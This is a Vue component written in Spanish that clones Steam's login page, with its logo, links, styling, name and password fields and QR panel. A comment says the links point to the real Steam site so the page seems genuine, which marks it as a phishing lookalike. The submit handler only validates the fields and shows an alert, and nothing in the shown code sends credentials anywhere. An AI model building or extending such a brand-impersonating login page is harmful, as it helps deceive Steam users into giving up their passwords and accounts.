<script setup>
import { ref } from "vue";

const email = ref("");
const password = ref("");
const remember = ref(false);

const handleSubmit = () => {
  if (!email.value || password.value.length < 6) {
    return alert("Todos los campos son obligatorios y la contraseña debe tener al menos 6 caracteres.");
  }
  alert("¡Inicio de sesión exitoso!");
};
</script>

<-- Aquello que no tiene el a=# es qp no le he puesto q lo redireccione a la pagina original de steam, dando a entender como si fuera la de adeveras xd-->
<template>
  <div class="navbar">
    <div class="navbar-content">
      <div class="logo">
        <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
          <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44">
        </a>
      </div>
      <div class="navbar-links">
        <a href="https://store.steampowered.com/?snr=1_60_4__global-header" class="selected-link">TIENDA</a>
        <a href="https://steamcommunity.com/">COMUNIDAD</a>
        <a href="https://store.steampowered.com/about/?snr=1_60_4__global-header">ACERCA DE</a>
        <a href="https://help.steampowered.com/es/">SOPORTE</a>
      </div>
      <div class="navbar-action-download">
        <a href="https://store.steampowered.com/about/?snr=1_60_4__global-header" class="install-link">Instalar Steam</a>
      </div>
      <div class="navbar-action-login">
        <a href="#" class="login-link">iniciar sesión</a>
      </div>
    </div>
  </div>

  <div class="page-content">
    <div class="login-container">
      <div class="login-left">
        <div class="login-form">
          <div class="form-header">
            <p>INICIA SESIÓN CON TU NOMBRE DE CUENTA</p>
          </div>
          <form @submit.prevent="handleSubmit">
            <div class="form-group">
              <input
                type="text"
                placeholder="Nombre de cuenta"
                v-model.trim="email"
                class="input-field"
              />
            </div>
            <div class="form-bottom">
              <p>CONTRASEÑA</p>
            </div>
            <div class="form-group">
              <input
                type="password"
                placeholder="Contraseña"
                v-model.trim="password"
                class="input-field"
              />
            </div>
            <div class="remember-me">
              <input type="checkbox" id="remember" v-model="remember">
              <label for="remember">Recordarme</label>
            </div>
            <div class="form-group">
              <button type="submit" class="submit-button">Iniciar sesión</button>
            </div>
          </form>
          <div class="help-link">
            <a href="#">Ayuda, no puedo iniciar sesión</a>
          </div>
        </div>
      </div>
      <div class="login-right">
        <div class="qr-section">
          <p>O BIEN CON UN CÓDIGO QR</p>
          <div class="qr-code">
            <div class="qr-image">
              <div class="qr-placeholder"></div>
              <div class="qr-icon">G</div>
            </div>
          </div>
          <p class="qr-info">Usa la <a href="https://store.steampowered.com/mobile">aplicación Steam Mobile</a> para iniciar sesión con un código QR</p>
        </div>
      </div>
    </div>
  </div>

  <div class="footer">
    <div class="new-account-section">
      <div class="new-account-container">
        <div class="new-account-text">
          <h2>¿Tu primera vez en Steam?</h2>
          <div class="create-account-button">
            <a href="#">Crea una cuenta</a>
          </div>
        </div>
        <div class="new-account-info">
          <p>Es gratis y muy fácil. Descubre miles de juegos para jugar con millones de amigos nuevos. <a href="#">Más información acerca de Steam</a></p>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
body {
  
  color: #acb2b8;
  font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
  margin: 0;
  padding: 0;
}

.navbar {
  background-color: #171a21;
  width: 100%;
  height: 104px;
  display: flex;
  justify-content: center;
}

.navbar-content {
  width: 940px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 16px;
}

.logo {
  margin-right: 40px;
}

.navbar-links {
  display: flex;
  gap: 20px;
  font-size: 14px;
  text-transform: uppercase;
  font-weight: 500;
}

.navbar-links a {
  color: #b6b7b4;
  text-decoration: none;
  padding: 8px 0;
}

.selected-link {
  color: #67c1f5 !important;
  position: relative;
}

.selected-link::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 4px;
  background-color: #67c1f5;
}

.navbar-action-login {
  display: flex;
  align-items: center;
  font-size: 12px;
}

.navbar-action-download {
  display: flex;
  align-items: center;
  font-size: 12px;
  background-color: #5c7e13;
  font-weight: bold;
  color: white;
}

.install-link, .login-link {
  color: #b8b6b4;
  text-decoration: none;
}

.install-link:hover, .login-link:hover, .navbar-links a:hover {
  color: #ffffff;
}

.page-content {
  background-image: url("https://store.cloudflare.steamstatic.com/public/shared/images/responsive/steam_share_image.jpg");
  background-size: cover;
  background-position: center;

  min-height: calc(100vh - 164px);
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px 0;
}

.login-container {
  display: flex;
  width: 616px;
  border-radius: 4px;
  overflow: hidden;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
}

.login-left {
  flex: 1;
  background-color: #181a21;
  padding: 24px;
}

.login-right {
  width: 264px;
  background-color: #181a21;
  padding: 24px;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.form-header p {
  color: #1999ff;
  font-size: 12px;
  margin: 0;
  text-transform: uppercase;
  font-weight: bold;
}

.form-group {
  margin-bottom: 16px;
}

.input-field {
  width: 100%;
  padding: 8px 10px;
  background-color: #32353c;
  border: none;
  border-radius: 2px;
  color: #e9e9e9;
  font-size: 14px;
  box-sizing: border-box;
}

.input-field:focus {
  outline: none;
  box-shadow: 0 0 2px #1999ff;
}

.remember-me {
  display: flex;
  align-items: center;
  margin-bottom: 16px;
  font-size: 12px;
  color: #acb2b8;
}

.remember-me input {
  margin-right: 5px;
  color: #acb2b8;
}

.submit-button {
  width: 100%;
  padding: 10px;
  background-color: #1999ff;
  color: white;
  border: none;
  border-radius: 2px;
  cursor: pointer;
  font-size: 16px;
  transition: background-color 0.2s;
}

.submit-button:hover {
  background-color: #3ba8ff;
}

.help-link {
  margin-top: 20px;
  text-align: center;
}

.help-link a {
  color: #acb2b8;
  font-size: 12px;
  text-decoration: none;
}

.help-link a:hover {
  color: #ffffff;
  text-decoration: underline;
}

.qr-section p:first-child {
  color: #1999ff;
  font-size: 12px;
  margin-bottom: 15px;
  font-weight: bold;
  text-transform: uppercase;
}

.qr-code {
  margin: 15px 0;
}

.qr-image {
  position: relative;
  width: 180px;
  height: 180px;
  margin: 0 auto;
}

.qr-placeholder {
  width: 100%;
  height: 100%;
  background-color: #444;
  opacity: 0.5;
}

.qr-info {
  font-size: 12px;
  line-height: 1.4;
  color: #acb2b8;
  margin-top: 15px;
}

.qr-info a {
  color: #acb2b8;
  text-decoration: underline;
}

.qr-info a:hover {
  color: #ffffff;
}

.footer {
  background-color: #171a21;
  color: #8f98a0;
  padding: 16px;
  font-size: 12px;
  text-align: center;
}

.form-bottom p {
  color: #575a5f;
  font-size: 12px;
  margin: 0;
  text-transform: uppercase;
  font-weight: bold;
}
</style>